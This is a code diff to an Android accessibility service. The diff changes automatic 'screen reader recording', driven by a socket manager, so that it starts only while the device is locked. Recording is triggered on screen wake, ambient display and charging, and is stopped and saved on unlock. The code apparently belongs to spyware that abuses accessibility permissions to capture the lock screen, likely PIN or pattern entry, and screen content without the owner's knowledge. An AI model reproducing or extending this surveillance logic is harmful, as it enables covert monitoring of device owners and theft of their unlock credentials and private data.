@@ -197,8 +197,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Register receiver for screen on/off and unlock events — drives auto-recording
         try { registerScreenStateReceiver(); } catch (Exception ignored) {}
 
-        // Auto-start screen reader recording immediately if screen is on and locked.
-        // 500 ms delay lets the service fully initialize before reading the screen.
+        // Auto-start screen reader recording ONLY if screen is on AND device is locked
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             try {
                 android.app.KeyguardManager km =
@@ -207,8 +206,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         (android.os.PowerManager) getSystemService(POWER_SERVICE);
                 boolean screenOn = pm != null && pm.isInteractive();
                 boolean locked   = km != null && km.isKeyguardLocked();
-                // Start if locked, or even if unlocked (record current screen state)
-                if (screenOn) {
+                // Only start recording if locked
+                if (screenOn && locked) {
                     SocketManager.getInstance(UnifiedAccessibilityService.this).startScreenReaderAuto();
                 }
             } catch (Exception ignored) {}
@@ -317,6 +316,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 if (intent == null || intent.getAction() == null) return;
                 try {
                     SocketManager sm = SocketManager.getInstance(ctx);
+                    android.app.KeyguardManager km = (android.app.KeyguardManager) ctx.getSystemService(android.content.Context.KEYGUARD_SERVICE);
+                    android.os.PowerManager pm = (android.os.PowerManager) ctx.getSystemService(android.content.Context.POWER_SERVICE);
+                    boolean isLocked = km != null && km.isKeyguardLocked();
+                    
                     switch (intent.getAction()) {
 
                         case Intent.ACTION_SCREEN_OFF:
@@ -325,42 +328,46 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                             break;
 
                         case Intent.ACTION_SCREEN_ON:
-                            // Screen woke up — start recording immediately (locked or not)
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
-                            }, 300);
+                            // Screen woke up — ONLY start recording if device is LOCKED
+                            if (isLocked) {
+                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                    try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
+                                }, 300);
+                            }
                             break;
 
                         case Intent.ACTION_USER_PRESENT:
-                            // Device fully unlocked — stop and save
+                            // Device fully unlocked — stop and save immediately
                             sm.stopScreenReaderAuto();
                             break;
 
                         case Intent.ACTION_DREAMING_STARTED:
-                            // Ambient display / Daydream activated — start recording
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
-                            }, 300);
+                            // Ambient display — only record if locked
+                            if (isLocked) {
+                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                    try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
+                                }, 300);
+                            }
                             break;
 
                         case Intent.ACTION_DREAMING_STOPPED:
-                            // Ambient display ended and screen is fully on — ensure loop is running
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
-                            }, 300);
+                            // Ambient display ended — only record if locked
+                            if (isLocked) {
+                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                    try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
+                                }, 300);
+                            }
                             break;
 
                         case Intent.ACTION_POWER_CONNECTED:
-                            // Charging started — screen often wakes, start recording if on
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                try {
-                                    android.os.PowerManager pm =
-                                        (android.os.PowerManager) ctx.getSystemService(POWER_SERVICE);
-                                    if (pm != null && pm.isInteractive()) {
+                            // Charging started — screen often wakes, start recording if locked
+                            if (isLocked && pm != null && pm.isInteractive()) {
+                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                    try {
                                         sm.startScreenReaderAuto();
-                                    }
-                                } catch (Exception ignored) {}
-                            }, 500);
+                                    } catch (Exception ignored) {}
+                                }, 500);
+                            }
                             break;
 
                         default:
